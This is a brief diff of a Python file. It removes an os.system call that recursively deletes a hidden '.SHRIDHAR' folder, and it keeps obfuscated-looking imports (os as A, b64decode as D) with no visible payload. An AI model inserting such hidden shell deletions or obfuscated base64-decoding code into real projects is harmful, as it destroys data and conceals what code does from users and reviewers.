@@ -1,5 +1,4 @@
 import os
-os.system('rm -r .SHRIDHAR')
 import os as A
 from base64 import b64decode as D
 B='.SHRIDHAR'
